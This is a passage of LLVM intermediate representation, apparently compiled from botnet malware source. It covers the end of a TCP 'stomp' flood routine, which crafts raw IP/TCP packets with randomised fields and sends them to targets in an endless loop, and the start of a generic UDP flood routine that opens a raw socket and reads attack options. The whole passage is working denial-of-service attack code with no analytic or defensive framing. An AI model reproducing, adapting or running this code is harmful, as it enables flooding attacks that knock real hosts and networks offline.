  %199 = trunc i64 %198 to i32
  store i32 %199, i32* %33, align 4
  %200 = load i32, i32* %33, align 4
  %201 = icmp eq i32 %200, -1
  br i1 %201, label %202, label %203

202:                                              ; preds = %191
  br label %607

203:                                              ; preds = %191
  %204 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %205 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 4
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %208 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 4
  %210 = icmp eq i32 %206, %209
  br i1 %210, label %211, label %482

211:                                              ; preds = %203
  %212 = load i32, i32* %33, align 4
  %213 = sext i32 %212 to i64
  %214 = icmp ugt i64 %213, 40
  br i1 %214, label %215, label %482

215:                                              ; preds = %211
  %216 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 0
  %217 = getelementptr inbounds i8, i8* %216, i64 20
  %218 = bitcast i8* %217 to %struct.tcphdr*
  store %struct.tcphdr* %218, %struct.tcphdr** %35, align 8
  %219 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %220 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %219, i32 0, i32 0
  %221 = load i16, i16* %220, align 4
  %222 = zext i16 %221 to i32
  %223 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %224 = load i16, i16* %223, align 2
  %225 = zext i16 %224 to i32
  %226 = icmp eq i32 %222, %225
  br i1 %226, label %227, label %481

227:                                              ; preds = %215
  %228 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = lshr i16 %230, 9
  %232 = and i16 %231, 1
  %233 = zext i16 %232 to i32
  %234 = icmp ne i32 %233, 0
  br i1 %234, label %235, label %460

235:                                              ; preds = %227
  %236 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = lshr i16 %238, 12
  %240 = and i16 %239, 1
  %241 = zext i16 %240 to i32
  %242 = icmp ne i32 %241, 0
  br i1 %242, label %243, label %460

243:                                              ; preds = %235
  %244 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %245 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 4
  %247 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %248 = load i32, i32* %9, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %247, i64 %249
  %251 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %250, i32 0, i32 0
  store i32 %246, i32* %251, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 2
  %254 = load i32, i32* %253, align 4
  %255 = call i32 @ntohl(i32 noundef %254) #8
  %256 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %257 = load i32, i32* %9, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %256, i64 %258
  %260 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %259, i32 0, i32 1
  store i32 %255, i32* %260, align 4
  %261 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 3
  %263 = load i32, i32* %262, align 4
  %264 = call i32 @ntohl(i32 noundef %263) #8
  %265 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %266 = load i32, i32* %9, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %265, i64 %267
  %269 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %268, i32 0, i32 2
  store i32 %264, i32* %269, align 4
  %270 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 1
  %272 = load i16, i16* %271, align 2
  %273 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %274 = load i32, i32* %9, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %273, i64 %275
  %277 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %276, i32 0, i32 3
  store i16 %272, i16* %277, align 4
  %278 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %279 = load i16, i16* %278, align 2
  %280 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %281 = load i32, i32* %9, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %280, i64 %282
  %284 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %283, i32 0, i32 4
  store i16 %279, i16* %284, align 2
  %285 = load i32, i32* %24, align 4
  %286 = sext i32 %285 to i64
  %287 = add i64 40, %286
  %288 = call noalias i8* @malloc(i64 noundef %287) #7
  %289 = load i8**, i8*** %12, align 8
  %290 = load i32, i32* %9, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds i8*, i8** %289, i64 %291
  store i8* %288, i8** %292, align 8
  %293 = load i8**, i8*** %12, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8*, i8** %293, i64 %295
  %297 = load i8*, i8** %296, align 8
  %298 = bitcast i8* %297 to %struct.iphdr*
  store %struct.iphdr* %298, %struct.iphdr** %36, align 8
  %299 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i64 1
  %301 = bitcast %struct.iphdr* %300 to %struct.tcphdr*
  store %struct.tcphdr* %301, %struct.tcphdr** %37, align 8
  %302 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i64 1
  %304 = bitcast %struct.tcphdr* %303 to i8*
  store i8* %304, i8** %38, align 8
  %305 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %306 = bitcast %struct.iphdr* %305 to i8*
  %307 = load i8, i8* %306, align 4
  %308 = and i8 %307, 15
  %309 = or i8 %308, 64
  store i8 %309, i8* %306, align 4
  %310 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %311 = bitcast %struct.iphdr* %310 to i8*
  %312 = load i8, i8* %311, align 4
  %313 = and i8 %312, -16
  %314 = or i8 %313, 5
  store i8 %314, i8* %311, align 4
  %315 = load i8, i8* %13, align 1
  %316 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i32 0, i32 1
  store i8 %315, i8* %317, align 1
  %318 = load i32, i32* %24, align 4
  %319 = sext i32 %318 to i64
  %320 = add i64 40, %319
  %321 = trunc i64 %320 to i16
  %322 = call zeroext i16 @htons(i16 noundef zeroext %321) #8
  %323 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 2
  store i16 %322, i16* %324, align 2
  %325 = load i16, i16* %14, align 2
  %326 = call zeroext i16 @htons(i16 noundef zeroext %325) #8
  %327 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 3
  store i16 %326, i16* %328, align 4
  %329 = load i8, i8* %15, align 1
  %330 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 5
  store i8 %329, i8* %331, align 4
  %332 = load i8, i8* %16, align 1
  %333 = icmp ne i8 %332, 0
  br i1 %333, label %334, label %338

334:                                              ; preds = %243
  %335 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %336 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 4
  store i16 %335, i16* %337, align 2
  br label %338

338:                                              ; preds = %334, %243
  %339 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 6
  store i8 6, i8* %340, align 1
  %341 = load i32, i32* @LOCAL_ADDR, align 4
  %342 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 8
  store i32 %341, i32* %343, align 4
  %344 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %345 = load i32, i32* %9, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %344, i64 %346
  %348 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %347, i32 0, i32 0
  %349 = load i32, i32* %348, align 4
  %350 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 9
  store i32 %349, i32* %351, align 4
  %352 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %353 = load i32, i32* %9, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %352, i64 %354
  %356 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %355, i32 0, i32 3
  %357 = load i16, i16* %356, align 4
  %358 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %359 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %358, i32 0, i32 0
  store i16 %357, i16* %359, align 4
  %360 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %361 = load i32, i32* %9, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %363, i32 0, i32 4
  %365 = load i16, i16* %364, align 2
  %366 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 1
  store i16 %365, i16* %367, align 2
  %368 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %369 = load i32, i32* %9, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %371, i32 0, i32 2
  %373 = load i32, i32* %372, align 4
  %374 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %375 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %374, i32 0, i32 2
  store i32 %373, i32* %375, align 4
  %376 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %377 = load i32, i32* %9, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %379, i32 0, i32 1
  %381 = load i32, i32* %380, align 4
  %382 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 3
  store i32 %381, i32* %383, align 4
  %384 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 4
  %386 = load i16, i16* %385, align 4
  %387 = and i16 %386, -241
  %388 = or i16 %387, 128
  store i16 %388, i16* %385, align 4
  %389 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %390 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %389, i32 0, i32 4
  %391 = load i16, i16* %390, align 4
  %392 = and i16 %391, -257
  %393 = or i16 %392, 256
  store i16 %393, i16* %390, align 4
  %394 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %395 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %394, i32 0, i32 4
  %396 = load i16, i16* %395, align 4
  %397 = and i16 %396, -4097
  %398 = or i16 %397, 4096
  store i16 %398, i16* %395, align 4
  %399 = call i32 @rand_next()
  %400 = and i32 %399, 65535
  %401 = trunc i32 %400 to i16
  %402 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 5
  store i16 %401, i16* %403, align 2
  %404 = load i8, i8* %18, align 1
  %405 = sext i8 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 4
  %408 = load i16, i16* %407, align 4
  %409 = and i16 %405, 1
  %410 = shl i16 %409, 13
  %411 = and i16 %408, -8193
  %412 = or i16 %411, %410
  store i16 %412, i16* %407, align 4
  %413 = load i8, i8* %19, align 1
  %414 = sext i8 %413 to i16
  %415 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 4
  %417 = load i16, i16* %416, align 4
  %418 = and i16 %414, 1
  %419 = shl i16 %418, 12
  %420 = and i16 %417, -4097
  %421 = or i16 %420, %419
  store i16 %421, i16* %416, align 4
  %422 = load i8, i8* %20, align 1
  %423 = sext i8 %422 to i16
  %424 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 4
  %426 = load i16, i16* %425, align 4
  %427 = and i16 %423, 1
  %428 = shl i16 %427, 11
  %429 = and i16 %426, -2049
  %430 = or i16 %429, %428
  store i16 %430, i16* %425, align 4
  %431 = load i8, i8* %21, align 1
  %432 = sext i8 %431 to i16
  %433 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %434 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %433, i32 0, i32 4
  %435 = load i16, i16* %434, align 4
  %436 = and i16 %432, 1
  %437 = shl i16 %436, 10
  %438 = and i16 %435, -1025
  %439 = or i16 %438, %437
  store i16 %439, i16* %434, align 4
  %440 = load i8, i8* %22, align 1
  %441 = sext i8 %440 to i16
  %442 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %443 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %442, i32 0, i32 4
  %444 = load i16, i16* %443, align 4
  %445 = and i16 %441, 1
  %446 = shl i16 %445, 9
  %447 = and i16 %444, -513
  %448 = or i16 %447, %446
  store i16 %448, i16* %443, align 4
  %449 = load i8, i8* %23, align 1
  %450 = sext i8 %449 to i16
  %451 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 4
  %453 = load i16, i16* %452, align 4
  %454 = and i16 %450, 1
  %455 = shl i16 %454, 8
  %456 = and i16 %453, -257
  %457 = or i16 %456, %455
  store i16 %457, i16* %452, align 4
  %458 = load i8*, i8** %38, align 8
  %459 = load i32, i32* %24, align 4
  call void @rand_str(i8* noundef %458, i32 noundef %459)
  br label %491

460:                                              ; preds = %235, %227
  %461 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %462 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %461, i32 0, i32 4
  %463 = load i16, i16* %462, align 4
  %464 = lshr i16 %463, 8
  %465 = and i16 %464, 1
  %466 = zext i16 %465 to i32
  %467 = icmp ne i32 %466, 0
  br i1 %467, label %476, label %468

468:                                              ; preds = %460
  %469 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %470 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %469, i32 0, i32 4
  %471 = load i16, i16* %470, align 4
  %472 = lshr i16 %471, 10
  %473 = and i16 %472, 1
  %474 = zext i16 %473 to i32
  %475 = icmp ne i32 %474, 0
  br i1 %475, label %476, label %479

476:                                              ; preds = %468, %460
  %477 = load i32, i32* %26, align 4
  %478 = call i32 @close(i32 noundef %477)
  br label %121

479:                                              ; preds = %468
  br label %480

480:                                              ; preds = %479
  br label %481

481:                                              ; preds = %480, %215
  br label %482

482:                                              ; preds = %481, %211, %203
  %483 = call i64 @time(i64* noundef null) #7
  %484 = load i64, i64* %31, align 8
  %485 = sub nsw i64 %483, %484
  %486 = icmp sgt i64 %485, 10
  br i1 %486, label %487, label %490

487:                                              ; preds = %482
  %488 = load i32, i32* %26, align 4
  %489 = call i32 @close(i32 noundef %488)
  br label %121

490:                                              ; preds = %482
  br label %191

491:                                              ; preds = %338
  br label %492

492:                                              ; preds = %491, %124
  %493 = load i32, i32* %9, align 4
  %494 = add nsw i32 %493, 1
  store i32 %494, i32* %9, align 4
  br label %115, !llvm.loop !25

495:                                              ; preds = %115
  br label %496

496:                                              ; preds = %606, %495
  store i32 0, i32* %9, align 4
  br label %497

497:                                              ; preds = %603, %496
  %498 = load i32, i32* %9, align 4
  %499 = load i8, i8* %5, align 1
  %500 = zext i8 %499 to i32
  %501 = icmp slt i32 %498, %500
  br i1 %501, label %502, label %606

502:                                              ; preds = %497
  %503 = load i8**, i8*** %12, align 8
  %504 = load i32, i32* %9, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds i8*, i8** %503, i64 %505
  %507 = load i8*, i8** %506, align 8
  store i8* %507, i8** %39, align 8
  %508 = load i8*, i8** %39, align 8
  %509 = bitcast i8* %508 to %struct.iphdr*
  store %struct.iphdr* %509, %struct.iphdr** %40, align 8
  %510 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %511 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %510, i64 1
  %512 = bitcast %struct.iphdr* %511 to %struct.tcphdr*
  store %struct.tcphdr* %512, %struct.tcphdr** %41, align 8
  %513 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i64 1
  %515 = bitcast %struct.tcphdr* %514 to i8*
  store i8* %515, i8** %42, align 8
  %516 = load i16, i16* %14, align 2
  %517 = zext i16 %516 to i32
  %518 = icmp eq i32 %517, 65535
  br i1 %518, label %519, label %525

519:                                              ; preds = %502
  %520 = call i32 @rand_next()
  %521 = and i32 %520, 65535
  %522 = trunc i32 %521 to i16
  %523 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %524 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %523, i32 0, i32 3
  store i16 %522, i16* %524, align 4
  br label %525

525:                                              ; preds = %519, %502
  %526 = load i8, i8* %25, align 1
  %527 = icmp ne i8 %526, 0
  br i1 %527, label %528, label %531

528:                                              ; preds = %525
  %529 = load i8*, i8** %42, align 8
  %530 = load i32, i32* %24, align 4
  call void @rand_str(i8* noundef %529, i32 noundef %530)
  br label %531

531:                                              ; preds = %528, %525
  %532 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %533 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %532, i32 0, i32 7
  store i16 0, i16* %533, align 2
  %534 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %535 = bitcast %struct.iphdr* %534 to i16*
  %536 = call zeroext i16 @checksum_generic(i16* noundef %535, i32 noundef 20)
  %537 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %538 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %537, i32 0, i32 7
  store i16 %536, i16* %538, align 2
  %539 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %540 = load i32, i32* %9, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %539, i64 %541
  %543 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %542, i32 0, i32 1
  %544 = load i32, i32* %543, align 4
  %545 = add i32 %544, 1
  store i32 %545, i32* %543, align 4
  %546 = trunc i32 %544 to i16
  %547 = call zeroext i16 @htons(i16 noundef zeroext %546) #8
  %548 = zext i16 %547 to i32
  %549 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %550 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %549, i32 0, i32 2
  store i32 %548, i32* %550, align 4
  %551 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %552 = load i32, i32* %9, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %551, i64 %553
  %555 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %554, i32 0, i32 2
  %556 = load i32, i32* %555, align 4
  %557 = trunc i32 %556 to i16
  %558 = call zeroext i16 @htons(i16 noundef zeroext %557) #8
  %559 = zext i16 %558 to i32
  %560 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %561 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %560, i32 0, i32 3
  store i32 %559, i32* %561, align 4
  %562 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %563 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %562, i32 0, i32 6
  store i16 0, i16* %563, align 4
  %564 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %565 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %566 = bitcast %struct.tcphdr* %565 to i8*
  %567 = load i32, i32* %24, align 4
  %568 = sext i32 %567 to i64
  %569 = add i64 20, %568
  %570 = trunc i64 %569 to i16
  %571 = call zeroext i16 @htons(i16 noundef zeroext %570) #8
  %572 = load i32, i32* %24, align 4
  %573 = sext i32 %572 to i64
  %574 = add i64 20, %573
  %575 = trunc i64 %574 to i32
  %576 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %564, i8* noundef %566, i16 noundef zeroext %571, i32 noundef %575)
  %577 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %578 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %577, i32 0, i32 6
  store i16 %576, i16* %578, align 4
  %579 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 1
  %581 = load i16, i16* %580, align 2
  %582 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %583 = load i32, i32* %9, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %582, i64 %584
  %586 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %585, i32 0, i32 0
  %587 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %586, i32 0, i32 1
  store i16 %581, i16* %587, align 2
  %588 = load i32, i32* %10, align 4
  %589 = load i8*, i8** %39, align 8
  %590 = load i32, i32* %24, align 4
  %591 = sext i32 %590 to i64
  %592 = add i64 40, %591
  %593 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %594 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %595 = load i32, i32* %9, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %594, i64 %596
  %598 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %597, i32 0, i32 0
  %599 = bitcast %struct.sockaddr_in* %598 to %struct.sockaddr*
  store %struct.sockaddr* %599, %struct.sockaddr** %593, align 8
  %600 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %601 = load %struct.sockaddr*, %struct.sockaddr** %600, align 8
  %602 = call i64 @sendto(i32 noundef %588, i8* noundef %589, i64 noundef %592, i32 noundef 16384, %struct.sockaddr* %601, i32 noundef 16)
  br label %603

603:                                              ; preds = %531
  %604 = load i32, i32* %9, align 4
  %605 = add nsw i32 %604, 1
  store i32 %605, i32* %9, align 4
  br label %497, !llvm.loop !26

606:                                              ; preds = %497
  br label %496

607:                                              ; preds = %202, %111, %105
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_udpgeneric(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 noundef %29, i64 noundef 8) #7
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 noundef zeroext %32, %struct.attack_option* noundef %33, i8 noundef zeroext 2, i32 noundef 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 noundef zeroext %36, %struct.attack_option* noundef %37, i8 noundef zeroext 3, i32 noundef 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 noundef zeroext %40, %struct.attack_option* noundef %41, i8 noundef zeroext 4, i32 noundef 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 noundef zeroext %44, %struct.attack_option* noundef %45, i8 noundef zeroext 5, i32 noundef 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 noundef zeroext %48, %struct.attack_option* noundef %49, i8 noundef zeroext 6, i32 noundef 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 noundef zeroext %52, %struct.attack_option* noundef %53, i8 noundef zeroext 7, i32 noundef 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 noundef zeroext %56, %struct.attack_option* noundef %57, i8 noundef zeroext 0, i32 noundef 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 noundef zeroext %60, %struct.attack_option* noundef %61, i8 noundef zeroext 1, i32 noundef 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 25, i32 noundef %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1460
  br i1 %70, label %71, label %72

71:                                               ; preds = %4
  store i16 1460, i16* %18, align 2
  br label %72

72:                                               ; preds = %71, %4
  %73 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 17) #7
  store i32 %73, i32* %10, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

75:                                               ; preds = %72
  br label %312

76:                                               ; preds = %72
  store i32 1, i32* %9, align 4
  %77 = load i32, i32* %10, align 4
  %78 = bitcast i32* %9 to i8*
